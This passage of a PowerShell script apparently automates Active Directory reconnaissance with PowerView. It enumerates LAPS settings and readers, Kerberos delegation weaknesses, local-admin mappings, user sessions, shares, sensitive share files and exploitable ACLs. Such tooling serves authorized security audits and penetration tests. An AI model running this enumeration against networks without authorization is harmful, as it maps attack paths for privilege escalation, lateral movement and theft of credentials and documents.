		Get-DomainGPO -Domain $Domain -Server $Server | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | Format-Table -AutoSize -Wrap
		$LAPSGPOLocation = Get-DomainGPO -Domain $Domain -Server $Server | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
		$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
		$LAPSGPOLocation = $LAPSGPOLocation.Trim()
		$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
		#ls $LAPSGPOLocation\Machine
		#Write-Host ""
		foreach($LAPSGPOLoc in $LAPSGPOLocation){
			$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
			$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
			$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
			$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
			$splitString | Format-Table -AutoSize -Wrap
			#$inputString = $null
			#$splitString = $null
			#type $LAPSGPOLoc\Machine\Registry.pol
		}
	}
	else{
		foreach ($AllDomain in $AllDomains){
			Get-DomainGPO -Domain $AllDomain | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | Format-Table -AutoSize -Wrap
			$LAPSGPOLocation = Get-DomainGPO -Domain $AllDomain | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
			$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
			$LAPSGPOLocation = $LAPSGPOLocation.Trim()
			$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
			#ls $LAPSGPOLocation\Machine
			#Write-Host ""
			foreach($LAPSGPOLoc in $LAPSGPOLocation){
				$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
				$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
				$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
				$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
				$splitString | Format-Table -AutoSize -Wrap
				#$inputString = $null
				#$splitString = $null
				#type $LAPSGPOLoc\Machine\Registry.pol
			}
		}
	}

	$inputString = $null
	$splitString = $null


	Write-Host ""
	Write-Host "LAPS Admin:" -ForegroundColor Cyan
	Write-Host ""
	if($Domain -AND $Server) {
		$LAPSGPOLocation = Get-DomainGPO -Domain $Domain -Server $Server | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
		$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
		$LAPSGPOLocation = $LAPSGPOLocation.Trim()
		$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
		#ls $LAPSGPOLocation\Machine
		#Write-Host ""
		foreach($LAPSGPOLoc in $LAPSGPOLocation){
			$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
			$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
			$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
			$splitString = ($splitString | Out-String) -split "`n"
			$splitString = $splitString.Trim()
			$splitString = $splitString | Where-Object { $_ -ne "" }
			$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
			$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
			if ($adminAccountRow) {
				$LAPSAdminresult = ($adminAccountRow -split ';')[4]
				Write-Output $LAPSAdminresult | Format-Table -AutoSize -Wrap
			}
		}
	}
	else{
		foreach ($AllDomain in $AllDomains){
			$LAPSGPOLocation = Get-DomainGPO -Domain $AllDomain | ? { $_.DisplayName -like "*laps*" } | select-object -ExpandProperty GPCFileSysPath
			$LAPSGPOLocation = ($LAPSGPOLocation | Out-String) -split "`n"
			$LAPSGPOLocation = $LAPSGPOLocation.Trim()
			$LAPSGPOLocation = $LAPSGPOLocation | Where-Object { $_ -ne "" }
			#ls $LAPSGPOLocation\Machine
			#Write-Host ""
			foreach($LAPSGPOLoc in $LAPSGPOLocation){
				$inputString = (type $LAPSGPOLoc\Machine\Registry.pol | Out-String)
				$splitString = $inputString.Substring($inputString.IndexOf('['), $inputString.LastIndexOf(']') - $inputString.IndexOf('[') + 1)
				$splitString = ($splitString -split '\[|\]').Where{$_ -ne ''}
				$splitString = ($splitString | Out-String) -split "`n"
				$splitString = $splitString.Trim()
				$splitString = $splitString | Where-Object { $_ -ne "" }
				$splitString = $splitString | ForEach-Object {$_.Trim() -replace '[^A-Za-z0-9\s;]', ''}
				$adminAccountRow = $splitString | Where-Object {$_ -match 'AdminAccountName'}
				if ($adminAccountRow) {
					$LAPSAdminresult = ($adminAccountRow -split ';')[4]
					Write-Output $LAPSAdminresult | Format-Table -AutoSize -Wrap
				}
			}
		}
	}

	$inputString = $null
	$splitString = $null

	Write-Host ""
	Write-Host "Who can read LAPS:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		#foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier | Format-Table -AutoSize -Wrap}
		Get-DomainComputer -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, @{Name="Delegated Groups";Expression={ConvertFrom-SID $_.SecurityIdentifier -Domain $Domain -Server $Server}} | Format-Table -AutoSize -Wrap
	}
	else{
		#foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier | Format-Table -AutoSize -Wrap}
		foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, @{Name="Delegated Groups";Expression={ConvertFrom-SID $_.SecurityIdentifier}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Computer objects where LAPS is enabled:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Domain $Domain -Server $Server | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Unconstrained Delegation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$DCs = Get-DomainController -Domain $Domain -Server $Server; Get-NetComputer -Domain $Domain -Server $Server -Unconstrained | Where-Object { $_.dnshostname -notmatch "($($DCs.Name -join ' - '))" } | Select-Object name, samaccountname, samaccounttype, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {$DCs = Get-DomainController -Domain $AllDomain; Get-NetComputer -Domain $AllDomain -Unconstrained | Where-Object { $_.dnshostname -notmatch "($($DCs.Name -join ' - '))" } | Select-Object name, samaccountname, samaccounttype, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Constrained Delegation (Computers):" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Domain $Domain -Server $Server -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Get-DomainComputer -Domain $AllDomain -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Constrained Delegation (Users):" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Get-DomainUser -Domain $AllDomain -TrustedToAuth -Properties Name,dnshostname,msds-AllowedToDelegateTo | Format-Table -AutoSize -Wrap}
	}
	
	Write-Host ""
	Write-Host "Resource Based Constrained Delegation:" -ForegroundColor Cyan
	Write-Host ""
	#foreach ($AllDomain in $AllDomains){$domainSID = Get-DomainSID $AllDomain ; Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" } | Select-Object @{Name='Computer_Object';Expression={([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])}},ActiveDirectoryRights,ObjectAceType,@{Name='Account';Expression={([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])}} -ExcludeProperty ObjectDN | Format-Table -AutoSize -Wrap -Property Computer_Object,ActiveDirectoryRights,ObjectAceType,Account}
	if($Domain -AND $Server) {
		$domainSID = Get-DomainSID $Domain -Server $Server
		Get-DomainComputer -Domain $Domain -Server $Server | Get-DomainObjectAcl -Domain $Domain -Server $Server -ResolveGUIDs | 
		? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | 
		Select-Object @{Name='Computer_Object';Expression={([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])}},ActiveDirectoryRights,ObjectAceType,@{Name='Account';Expression={([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])}} -ExcludeProperty ObjectDN | 
		Format-Table -AutoSize -Wrap -Property Computer_Object,ActiveDirectoryRights,ObjectAceType,Account
	}
	else{
		foreach ($AllDomain in $AllDomains){
			$domainSID = Get-DomainSID $AllDomain 
			Get-DomainComputer -Domain $AllDomain | Get-DomainObjectAcl -ResolveGUIDs | 
			? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$domainSID-[\d]{4,10}" -and $_.SecurityIdentifier.Translate([System.Security.Principal.NTAccount]) -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | 
			Select-Object @{Name='Computer_Object';Expression={([System.Security.Principal.SecurityIdentifier]$_.ObjectSID).Translate([System.Security.Principal.NTAccount])}},ActiveDirectoryRights,ObjectAceType,@{Name='Account';Expression={([System.Security.Principal.SecurityIdentifier]$_.SecurityIdentifier).Translate([System.Security.Principal.NTAccount])}} -ExcludeProperty ObjectDN | 
			Format-Table -AutoSize -Wrap -Property Computer_Object,ActiveDirectoryRights,ObjectAceType,Account
		}
	}
	
<# 	Write-Host ""
	Write-Host "Admin Users that allow delegation, logged into servers that allow unconstrained delegation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-DomainUserLocation -Domain $Domain -Server $Server -ComputerUnconstrained -UserAdminCount -UserAllowDelegation | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Find-DomainUserLocation -Domain $AllDomain -ComputerUnconstrained -UserAdminCount -UserAllowDelegation | Format-Table -AutoSize -Wrap}
	} #>

	Write-Host ""
	Write-Host "Privileged users that aren't marked as sensitive/not for delegation:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server -AllowDelegation -AdminCount | select-object samaccountname, @{Name="Domain";Expression={$Domain}} | Format-Table -AutoSize -Wrap
	}
	else{
		foreach ($AllDomain in $AllDomains) {Get-DomainUser -Domain $AllDomain -AllowDelegation -AdminCount | select-object samaccountname, @{Name="Domain";Expression={$AllDomain}} | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGPOLocalGroup -Domain $Domain -Server $Server | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGPOLocalGroup -Domain $AllDomain | select GPODisplayName, GroupName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Machines where a specific domain user/group is a member of the Administrators local group:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGPOUserLocalGroupMapping -Domain $Domain -Server $Server -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGPOUserLocalGroupMapping -Domain $AllDomain -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Users which are in a local group of a machine using GPO:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainComputer -Domain $Domain -Server $Server | Find-GPOComputerAdmin -Domain $Domain -Server $Server | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainComputer -Domain $AllDomain | Find-GPOComputerAdmin | Select-Object ComputerName, ObjectName, ObjectSID, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Machines where a user is member of a specific group:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainUser -Domain $Domain -Server $Server | Find-GPOLocation -Domain $Domain -Server $Server | Select-Object ObjectName, ObjectSID, Domain, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainUser -Domain $AllDomain | Find-GPOLocation | Select-Object ObjectName, ObjectSID, Domain, IsGroup, GPODisplayName, GPOPath | Format-Table -AutoSize -Wrap}
	}

	Write-Host ""
	Write-Host "Find Local Admin Access:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-LocalAdminAccess -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-LocalAdminAccess -Domain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Out-String}
	}
	

	Write-Host ""
	Write-Host "Find Domain User Location:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-DomainUserLocation -Domain $Domain -Server $Server -Delay 1 | select UserName, SessionFromName | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-DomainUserLocation -Domain $AllDomain -Delay 1 | select UserName, SessionFromName | Out-String}
	}

<# 	Write-Host ""
	Write-Host "Audit the permissions of AdminSDHolder, resolving GUIDs:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$dcName = "dc=" + $Domain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObjectAcl -Domain $Domain -Server $Server -SearchBase "CN=AdminSDHolder,CN=System,$dcName" -ResolveGUIDs | select ObjectDN,AceQualifier,ActiveDirectoryRights,ObjectAceType | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){$dcName = "dc=" + $AllDomain.Split("."); $dcName = $dcName -replace " ", ",dc="; Get-DomainObjectAcl -Domain $AllDomain -SearchBase "CN=AdminSDHolder,CN=System,$dcName" -ResolveGUIDs | select ObjectDN,AceQualifier,ActiveDirectoryRights,ObjectAceType | Out-String}
	} #>

	Write-Host ""
	Write-Host "Find any machine accounts in privileged groups:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Get-DomainGroup -Domain $Domain -Server $Server -AdminCount | Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse | ?{$_.MemberName -like '*$'} | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Get-DomainGroup -Domain $AllDomain -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} | Out-String}
	}

	Write-Host ""
	Write-Host "Find Domain Shares:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String
	}
	
	else{
		foreach($AllDomain in $AllDomains){Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1 | Select Name,Remark,ComputerName | Out-String}
	}

	Write-Host ""
	Write-Host "Find Interesting Domain Share Files:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Out-String}
	}
	
	Write-Host ""
	Write-Host "Second run (more file extensions):"
	if($Domain -AND $Server) {
		Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String
	}
	else{
		foreach($AllDomain in $AllDomains){Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 | Out-String}
	}

	Write-Host ""
	Write-Host "Find interesting ACLs:" -ForegroundColor Cyan
	#Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | Out-String
	if($Domain -AND $Server) {
		Invoke-ACLScanner -Domain $Domain -Server $Server -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap
	}
	else{
		foreach($AllDomain in $AllDomains){Invoke-ACLScanner -Domain $AllDomain -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -notmatch "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Managed Availability Servers|Exchange Windows Permissions" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights | ft -AutoSize -Wrap}
	}

}
